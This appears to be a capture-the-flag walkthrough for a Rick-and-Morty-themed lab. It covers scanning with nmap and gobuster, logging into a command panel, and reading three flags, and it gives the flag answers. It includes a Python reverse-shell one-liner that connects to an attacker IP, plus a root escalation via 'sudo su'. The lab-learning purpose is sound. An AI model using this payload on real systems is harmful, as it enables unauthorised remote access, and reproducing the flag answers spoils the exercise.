- first view source code to find `username: R1ckRul3s` , then go to `/robots.txt` and e get a string `Wubbalubbadubdub` which may be the password for something.

- we run enumeration like nmap scan and gobuster 
> `nmap -sC -sV 10.10.216.184 -Pn --vv`
> `gobuster dir -u http://10.10.216.184/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,py -t 100`
>this gives us info that port `22` and `80` are open and there is a `login.php` endpoint 

- we go to login.php and type in the credentials and that takes us to a command interface when we do `ls` we see `Sup3rS3cretPickl3Ingred.txt` , if we try to cat it out it doesnt allow it so we do `less Sup3rS3cretPickl3Ingred.txt` and it gives flag 1 -> `mr. meeseek hair`

- theres a clue.txt that tells us to navigate file system so we try for a reverse shell using payload 
>`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.94.67",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

- now this gives us shell but we want fully interactive `TTY` to navigate file system so we run the command 
> `python3 -c 'import pty;pty.spawn("/bin/bash")'`

- now we get the proper terminal and we go to `/` and do `cd /home/rick` and do `cat 'second ingredients'` and it gives flag 2 -> `1 jerry tear`

- to get `root access` we have to think of privilege escalation first and foremost try `sudo su` and it surprisingly works so we go to `cd /root` and `cat 3rd.txt` and we get flag 3 -> `fleeb juice`
---
